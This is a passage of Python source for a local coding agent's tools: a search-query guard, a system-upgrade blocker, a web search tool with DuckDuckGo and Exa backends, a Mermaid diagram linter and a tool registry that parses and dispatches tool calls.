        if len(query) > cls.MAX_QUERY_LENGTH:
            return False, (
                f"Query too long ({len(query)} chars, max {cls.MAX_QUERY_LENGTH}). "
                "Shorten to a concise natural-language question."
            )

        # Check for IP leakage patterns (internal URLs, credentials, etc.)
        for pattern in cls.IP_LEAK_PATTERNS:
            if re.search(pattern, query, re.IGNORECASE):
                return False, (
                    "Query contains potentially sensitive information "
                    "(internal URL, credential, or private network address). "
                    "Remove sensitive details and rephrase as a general question."
                )

        # Check for definite code patterns (not just mentions)
        for pattern in cls.CODE_PATTERNS:
            if re.search(pattern, query, re.IGNORECASE):
                return False, f"Query contains code pattern: {pattern}"

        # Check for multi-line code syntax
        for pattern in cls.CODE_SYNTAX_PATTERNS:
            if re.search(pattern, query):
                return False, "Query appears to contain code blocks"

        # Check for file content dumps (multiple lines with indentation)
        lines = query.strip().splitlines()
        if len(lines) > 5:
            return False, (
                "Query contains multiple lines — looks like a code/file dump. "
                "Rephrase as a short natural-language question."
            )

        # Query should be at least 2 words
        words = query.split()
        if len(words) < 2:
            return False, "Query too short - provide a general question"

        return True, ""


class SystemUpgradeGuard:
    """Detects and blocks attempts to upgrade system-level packages/dependencies."""
    
    SYSTEM_PACKAGE_PATTERNS = [
        r'upgrade\s+(python|java|node|ruby|go|rust|php|perl|r)',
        r'update\s+(python|java|node|ruby|go|rust|php|perl|r)\s+version',
        r'python\s+3\.\d+\s*->\s*3\.\d+',
        r'python\s+3\.\d+\s+to\s+3\.\d+',
        r'from\s+python\s+3\.\d+\s+to\s+3\.\d+',
        r'install\s+python\s+3\.\d+',
        r'use\s+python\s+3\.\d+',
        r'switch\s+to\s+python\s+3\.\d+',
        r'change\s+python\s+version',
        r'set\s+python\s+version',
        r'upgrade\s+node\.js',
        r'upgrade\s+nodejs',
        r'update\s+node\.js',
        r'upgrade\s+java',
        r'update\s+java',
        r'install\s+java\s+\d+',
        r'switch\s+java\s+version',
        r'change\s+java\s+version',
        r'upgrade\s+system',
        r'upgrade\s+os',
        r'distro\s+upgrade',
        r'apt\s+upgrade',
        r'yum\s+upgrade',
        r'dnf\s+upgrade',
        r'brew\s+upgrade',
        r'pip\s+install\s+--upgrade\s+pip',
        r'pip\s+install\s+--upgrade\s+python',
    ]
    
    # Languages/runtimes that shouldn't be upgraded via task
    PROTECTED_RUNTIMES = [
        'python', 'java', 'node', 'nodejs', 'ruby', 'go', 'rust', 'php', 'perl', 'r'
    ]
    
    @classmethod
    def is_safe_task(cls, task_description: str) -> tuple[bool, str, Optional[str]]:
        """
        Check if task is safe to execute.
        Returns (is_safe, reason_if_unsafe, report_content_if_abort)
        """
        task_lower = task_description.lower()
        
        # Check for system upgrade patterns
        for pattern in cls.SYSTEM_PACKAGE_PATTERNS:
            if re.search(pattern, task_lower):
                report = cls._create_abort_report(task_description, pattern)
                return False, f"Task involves system package upgrade: {pattern}", report
        
        # Check for version jump patterns (e.g., Python 3.8 -> 3.12)
        version_jump = re.findall(r'3\.(\d+)', task_lower)
        if len(version_jump) >= 2:
            versions = [int(v) for v in version_jump]
            if max(versions) - min(versions) >= 2:
                report = cls._create_abort_report(task_description, "major version jump detected")
                return False, "Task involves major version upgrade", report
        
        return True, "", None
    
    @classmethod
    def _create_abort_report(cls, task_description: str, reason: str) -> str:
        """Create an abort report explaining why the task can't be performed."""
        return f"""# Task Abort Report

## Task Description
{task_description}

## Reason for Abort
This task was blocked because it attempts to modify system-level components: {reason}

## Why This Is Blocked
The coding agent is designed to work within your existing development environment. 
Upgrading system-level packages (Python, Java, Node.js, etc.) can:
- Break system dependencies
- Cause compatibility issues with other applications
- Require root/admin privileges
- Potentially damage the operating system

## Recommended Actions
1. **Manual upgrade required**: System package upgrades should be done manually by you
2. **Use virtual environments**: For Python, use venv or conda to manage project-specific dependencies
3. **Containerized environments**: Consider Docker for isolated development environments
4. **Check documentation**: Refer to your OS/package manager documentation for proper upgrade procedures

## What The Agent Can Do Instead
- Update project-specific dependencies (requirements.txt, package.json, etc.)
- Refactor code to work with current versions
- Add compatibility layers
- Update build scripts for current environment

---
This report was generated automatically by the coding agent.
"""


class WebSearchTool:
    """Search the web for general information (with safeguards against code searches)."""
    name = "web_search"
    description = "Search the web for general information (NOT for code)"
    
    # JSON Schema for tool definition
    schema = {
        "name": "web_search",
        "description": "Search the web for general information. Use for questions about concepts, documentation, tutorials. NOT for searching code.",
        "parameters": {
            "type": "object",
            "properties": {
                "query": {
                    "type": "string",
                    "description": "Search query - use natural language questions, NOT code"
                }
            },
            "required": ["query"]
        }
    }
    
    def __init__(self):
        self.guard = SearchGuard()
    
    def execute(self, query: str) -> str:
        """Execute a web search with validation."""
        # Validate query first
        is_safe, reason = self.guard.is_safe_query(query)
        if not is_safe:
            return f"Error: Search rejected - {reason}\n\nThis tool is for general questions only. Do not search for code. Ask general questions like 'how does React useEffect work' instead of 'def useEffect()'."

        # Free/default backend first (Hermes-style fallback pattern):
        # use DuckDuckGo via ddgs when premium API backends are not configured.
        ddgs_result = self._search_with_ddgs(query)
        if ddgs_result is not None:
            return ddgs_result

        # Optional premium backend (only if EXA_API_KEY is configured).
        exa_result = self._search_with_exa(query)
        if exa_result is not None:
            return exa_result

        return (
            "Error: No web search backend available.\n"
            "Install free backend: pip install ddgs\n"
            "Optional premium backend: pip install exa-py and set EXA_API_KEY"
        )

    def _search_with_ddgs(self, query: str) -> Optional[str]:
        """Search with ddgs (free) and return formatted results or None."""
        try:
            from ddgs import DDGS
        except ImportError:
            return None

        try:
            with DDGS() as ddgs:
                results = list(ddgs.text(query, max_results=5))

            if not results:
                return "No results found"

            formatted = ["Web Search Results (DuckDuckGo):\n"]
            for i, r in enumerate(results, 1):
                title = r.get("title") or "No title"
                url = r.get("href") or r.get("url") or "No URL"
                snippet = r.get("body") or r.get("snippet") or ""
                formatted.append(f"{i}. {title}")
                formatted.append(f"   {url}")
                if snippet:
                    formatted.append(f"   {snippet[:200]}...")
                formatted.append("")
            return "\n".join(formatted)
        except Exception as e:
            import logging
            logging.getLogger("coding-agent").warning(
                "ddgs search failed: %s (query: %s). Falling back to next backend.",
                e, query[:80],
            )
            return None

    def _search_with_exa(self, query: str) -> Optional[str]:
        """Search with Exa (optional paid backend) and return results or None."""
        if not os.getenv("EXA_API_KEY"):
            return None

        try:
            from exa import Exa
        except ImportError:
            return None

        try:
            exa = Exa()
            results = exa.search(query, num_results=5)
            if results and results.results:
                formatted = ["Web Search Results (Exa):\n"]
                for i, r in enumerate(results.results, 1):
                    formatted.append(f"{i}. {r.title or 'No title'}")
                    formatted.append(f"   {r.url}")
                    if r.description:
                        formatted.append(f"   {r.description[:200]}...")
                    formatted.append("")
                return "\n".join(formatted)
            return "No results found"
        except Exception:
            return None


class MermaidLintTool:
    """Validate the syntax of Mermaid diagrams embedded in a Markdown file.

    Performs a lightweight static check that catches the most common breakages
    we see from local LLMs:
      - missing or unbalanced ```mermaid fences
      - missing `graph <DIR>` header
      - inline `:::` styling (not supported on older Mermaid renderers)
      - subgraph/end imbalance
      - node IDs containing whitespace or punctuation
      - edges referencing undeclared node IDs

    This is intentionally a syntactic linter, not a full parser. It only flags
    issues that would prevent the diagram from rendering or that violate the
    style rules required by the `architecture` skill.
    """
    name = "mermaid_lint"
    description = "Lint Mermaid diagrams in a Markdown file. Returns 'OK' or a list of issues."

    schema = {
        "name": "mermaid_lint",
        "description": (
            "Validate the Mermaid diagram(s) in a Markdown file. "
            "Returns 'OK' if all diagrams parse with the strict rules used by "
            "the architecture skill, otherwise returns a list of issues with "
            "line numbers so they can be fixed."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Path to the Markdown file containing the ```mermaid fenced block(s)."
                }
            },
            "required": ["path"]
        }
    }

    # Mermaid keywords that should NOT be treated as node IDs when we scan
    # for undeclared references.
    _KEYWORDS = {
        "graph", "flowchart", "subgraph", "end", "classDef", "class",
        "linkStyle", "click", "direction", "TD", "TB", "BT", "RL", "LR",
        "style",
    }

    def __init__(self, cwd: Path = None):
        self.cwd = cwd or Path(".")

    def execute(self, path: str) -> str:
        try:
            file_path = Path(path)
            if not file_path.is_absolute():
                file_path = self.cwd / file_path
            if not file_path.exists():
                return f"Error: File '{path}' not found."

            content = file_path.read_text(encoding="utf-8", errors="replace")
        except Exception as e:
            return f"Error reading file: {e}"

        blocks = self._extract_mermaid_blocks(content)
        if not blocks:
            return (
                "ISSUES:\n"
                "- No ```mermaid fenced block found in the file. "
                "The output must contain a fenced ```mermaid ... ``` block."
            )

        all_issues: list[str] = []
        for idx, (start_line, body) in enumerate(blocks, 1):
            issues = self._lint_block(body, start_line)
            if issues:
                prefix = f"Block #{idx} (starts at line {start_line}):"
                all_issues.append(prefix)
                all_issues.extend(f"  - {iss}" for iss in issues)

        if all_issues:
            return "ISSUES:\n" + "\n".join(all_issues)
        return f"OK: {len(blocks)} Mermaid block(s) passed the lint."

    @staticmethod
    def _extract_mermaid_blocks(content: str) -> list[tuple[int, str]]:
        """Extract all ```mermaid ... ``` blocks. Returns [(start_line, body), ...]."""
        blocks = []
        lines = content.splitlines()
        i = 0
        while i < len(lines):
            stripped = lines[i].strip()
            if stripped.startswith("```mermaid"):
                start = i + 1  # 1-indexed line where the body begins
                body_lines: list[str] = []
                i += 1
                while i < len(lines) and not lines[i].strip().startswith("```"):
                    body_lines.append(lines[i])
                    i += 1
                blocks.append((start + 1, "\n".join(body_lines)))
            i += 1
        return blocks

    def _lint_block(self, body: str, start_line: int) -> list[str]:
        issues: list[str] = []
        lines = body.splitlines()
        if not lines:
            return ["empty mermaid block"]

        # Find the first non-blank, non-comment line — it must be the graph header.
        header = None
        for ln in lines:
            s = ln.strip()
            if not s or s.startswith("%%"):
                continue
            header = s
            break
        if not header or not re.match(r'^(graph|flowchart)\s+(TD|TB|BT|RL|LR)\b', header):
            issues.append(
                "first non-blank line must be `graph TD` (or another valid "
                f"`graph <DIR>` / `flowchart <DIR>`), got: {header!r}"
            )

        # Inline classDef application via `:::class` is rejected for portability.
        for i, ln in enumerate(lines, start=start_line):
            if ":::" in ln:
                issues.append(
                    f"line {i}: inline ':::' class styling is not allowed "
                    "(use `class NodeA,NodeB level1` at the bottom instead)"
                )

        # Subgraph / end balance.
        open_subgraphs = 0
        for i, ln in enumerate(lines, start=start_line):
            s = ln.strip()
            if re.match(r'^subgraph\b', s):
                open_subgraphs += 1
                # Subgraph ID must be ASCII (token right after 'subgraph')
                m = re.match(r'^subgraph\s+([^\s\[\(]+)', s)
                if m and not re.fullmatch(r'[A-Za-z][A-Za-z0-9_]*', m.group(1)):
                    issues.append(
                        f"line {i}: subgraph id {m.group(1)!r} must be ASCII letters/digits only "
                        "(put display text inside `[\"...\"]`)"
                    )
            elif s == "end":
                open_subgraphs -= 1
                if open_subgraphs < 0:
                    issues.append(f"line {i}: stray `end` without matching `subgraph`")
                    open_subgraphs = 0
        if open_subgraphs > 0:
            issues.append(f"missing {open_subgraphs} `end` keyword(s) to close open subgraph(s)")

        # Collect declared node IDs and edges.
        declared: set[str] = set()
        edge_refs: list[tuple[int, str, str]] = []  # (line, src, dst)

        # A node declaration is any token that appears before `[`, `(`, `{`, `>` or stands alone on a line
        # (excluding keywords and class lines).
        for i, ln in enumerate(lines, start=start_line):
            s = ln.strip()
            if not s or s.startswith("%%"):
                continue
            if re.match(r'^(graph|flowchart|subgraph|end|classDef|class|linkStyle|click|direction|style)\b', s):
                # classDef / class lines: collect node IDs from `class A,B level1`
                m = re.match(r'^class\s+([A-Za-z0-9_,\s]+)\s+\w+', s)
                if m:
                    for nid in m.group(1).split(","):
                        nid = nid.strip()
                        if nid:
                            edge_refs.append((i, nid, nid))  # treat as reference too
                continue

            # Split on edge operators to find endpoints. Mermaid edge ops:
            # -->, --x, --o, -.->, ==>, ---, -.-, ===
            edge_split = re.split(r'\s*(?:-->|---|--x|--o|-\.->|-\.-|==>|===)\s*', s)
            tokens = [t.strip() for t in edge_split if t.strip()]

            # Declare each endpoint and capture the bare ID.
            endpoint_ids: list[str] = []
            for tok in tokens:
                # Strip an optional edge label like `-- "foo" -->` residue.
                # An endpoint looks like:  ID  or  ID["Label"]  or  ID("Label")  or  ID{"Label"}
                m = re.match(r'^([A-Za-z][A-Za-z0-9_]*)(\s*[\[\(\{].*)?$', tok)
                if not m:
                    # Could be an edge label fragment in quotes, skip silently.
                    if not (tok.startswith('"') and tok.endswith('"')):
                        issues.append(
                            f"line {i}: cannot parse token {tok!r} as a node id "
                            "(IDs must be ASCII letters/digits/underscore; put labels inside `[\"...\"]`)"
                        )
                    continue
                nid = m.group(1)
                if nid in self._KEYWORDS:
                    continue
                declared.add(nid)
                endpoint_ids.append(nid)

            # If we found 2+ endpoints, record edges between consecutive ones.
            for a, b in zip(endpoint_ids, endpoint_ids[1:]):
                edge_refs.append((i, a, b))

        # Verify every edge references a declared node. (declared was populated
        # from the same scan, so this mainly catches typos via `class` lines.)
        for ln_no, a, b in edge_refs:
            for nid in (a, b):
                if nid and nid not in declared and nid not in self._KEYWORDS:
                    issues.append(
                        f"line {ln_no}: node id {nid!r} is referenced but never declared "
                        "(add it as `NodeId[\"Label\"]` somewhere in the diagram)"
                    )

        return issues


class ToolRegistry:
    """Registry of available tools."""
    
    def __init__(self, config: AgentConfig, repo):
        self.tools = {}
        self._register_default_tools(config, repo)
    
    def _register_default_tools(self, config: AgentConfig, repo):
        cwd = Path(repo.working_dir or ".") if repo else Path(".")
        checkpoint_manager = CheckpointManager(cwd, config.workspace_dir)
        self.tools["file_tree"] = FileTreeTool(cwd)
        self.tools["file_read"] = FileReadTool(cwd)
        self.tools["file_write"] = FileWriteTool(cwd, checkpoint_manager=checkpoint_manager)
        self.tools["file_edit"] = FileEditTool(cwd, checkpoint_manager=checkpoint_manager)
        self.tools["bash"] = BashTool(cwd)
        self.tools["list_files"] = ListFilesTool(cwd)
        self.tools["grep"] = GrepTool(cwd)
        self.tools["web_search"] = WebSearchTool()
        self.tools["mermaid_lint"] = MermaidLintTool(cwd)
        self.tools["done"] = DoneTool()
        if repo:
            self.tools["git_status"] = GitStatusTool(repo)
            self.tools["git_diff"] = GitDiffTool(repo)
            self.tools["revert_file"] = RevertFileTool(repo, cwd)
    
    def register(self, tool):
        self.tools[tool.name] = tool
    
    def get(self, name: str):
        return self.tools.get(name)
    
    def list_tools(self) -> str:
        """List tools with JSON schemas for better LLM understanding."""
        import json
        tool_schemas = []
        
        for name, tool in self.tools.items():
            if hasattr(tool, 'schema'):
                tool_schemas.append(tool.schema)
            else:
                # Fallback for tools without schema
                tool_schemas.append({
                    "name": name,
                    "description": getattr(tool, 'description', ''),
                    "parameters": {"type": "object", "properties": {}}
                })
        
        # Return as formatted JSON for the prompt
        return "## Tools (JSON Schema)\n\n" + json.dumps(tool_schemas, indent=2)
    
    def list_tools_simple(self) -> str:
        """Simple list of tools with descriptions (fallback)."""
        return "\n".join([f"- {name}: {tool.description}" for name, tool in self.tools.items()])

    def get_tool_schemas_native(self) -> list:
        """Return tool schemas in OpenAI/Ollama native function-calling format.

        Format: [{"type": "function", "function": {"name": ..., "description": ..., "parameters": ...}}]
        """
        schemas = []
        for name, tool in self.tools.items():
            if hasattr(tool, 'schema'):
                s = tool.schema
                schemas.append({
                    "type": "function",
                    "function": {
                        "name": s.get("name", name),
                        "description": s.get("description", ""),
                        "parameters": s.get("parameters", {"type": "object", "properties": {}}),
                    },
                })
            else:
                schemas.append({
                    "type": "function",
                    "function": {
                        "name": name,
                        "description": getattr(tool, 'description', ''),
                        "parameters": {"type": "object", "properties": {}},
                    },
                })
        return schemas

    def execute_by_name(self, name: str, kwargs: dict) -> str:
        """Execute a tool by name with a dict of arguments (for native tool calling)."""
        tool = self.get(name)
        if not tool:
            return f"Error: Unknown tool '{name}'. Available: {list(self.tools.keys())}"
        try:
            # Determine which kwargs the tool's execute() actually accepts
            import inspect
            sig = inspect.signature(tool.execute)
            valid_params = set(sig.parameters.keys())
            has_var_keyword = any(
                p.kind == inspect.Parameter.VAR_KEYWORD
                for p in sig.parameters.values()
            )

            # Strip unexpected kwargs unless the method accepts **kwargs
            if not has_var_keyword:
                filtered = {k: v for k, v in kwargs.items() if k in valid_params}
            else:
                filtered = kwargs

            # Check for missing required parameters before calling
            required_params = {
                k for k, p in sig.parameters.items()
                if p.default is inspect.Parameter.empty
                and p.kind not in (inspect.Parameter.VAR_POSITIONAL, inspect.Parameter.VAR_KEYWORD)
                and k != "self"
            }
            missing = required_params - set(filtered.keys())
            if missing:
                return (
                    f"Error: {name}() missing required argument(s): {', '.join(sorted(missing))}. "
                    f"Please retry with all required parameters: {', '.join(sorted(required_params))}"
                )

            # Convert all values to strings for tools that expect string args
            # (e.g. start_line="50" vs start_line=50)
            str_kwargs = {k: str(v) if not isinstance(v, str) else v for k, v in filtered.items()}
            return tool.execute(**str_kwargs)
        except TypeError as e:
            # If string conversion causes issues, try with original types
            try:
                return tool.execute(**filtered)
            except Exception:
                return f"Error executing {name}: {e}"
        except Exception as e:
            return f"Error executing {name}: {e}"

    
    def execute(self, tool_call: str) -> str:
        """Execute a tool from a tool call string like 'file_read(path="foo.txt")'"""
        try:
            # Parse tool call
            match = re.match(r'(\w+)\((.*)\)', tool_call.strip())
            if not match:
                return f"Error: Invalid tool call format: {tool_call}"
            
            tool_name = match.group(1)
            args_str = match.group(2)
            
            tool = self.get(tool_name)
            if not tool:
                return f"Error: Unknown tool '{tool_name}'. Available: {list(self.tools.keys())}"
            
            # Parse arguments
            kwargs = {}
            if args_str.strip():
                # Parse key=value pairs, handling escaped quotes in values
                i = 0
                while i < len(args_str):
                    # Skip whitespace and commas
                    while i < len(args_str) and args_str[i] in ' ,\t\n':
                        i += 1
                    if i >= len(args_str):
                        break

                    # Find key
                    key_match = re.match(r'(\w+)\s*=\s*', args_str[i:])
                    if not key_match:
                        break
                    key = key_match.group(1)
                    i += key_match.end()

                    # Find value
                    if i < len(args_str) and args_str[i] in ('"', "'"):
                        quote = args_str[i]
                        i += 1
                        value_chars = []
                        while i < len(args_str):
                            if args_str[i] == '\\' and i + 1 < len(args_str):
                                # Escaped character
                                next_ch = args_str[i + 1]
                                if next_ch == 'n':
                                    value_chars.append('\n')
                                elif next_ch == 't':
                                    value_chars.append('\t')
                                else:
                                    value_chars.append(next_ch)
                                i += 2
                            elif args_str[i] == quote:
                                i += 1
                                break
                            else:
                                value_chars.append(args_str[i])
                                i += 1
                        kwargs[key] = ''.join(value_chars)
                    else:
                        # Unquoted value
                        val_match = re.match(r'([^,\s]*)', args_str[i:])
                        if val_match:
                            kwargs[key] = val_match.group(1)
                            i += val_match.end()
            
            return tool.execute(**kwargs)
            
        except Exception as e:
            return f"Error executing tool: {e}"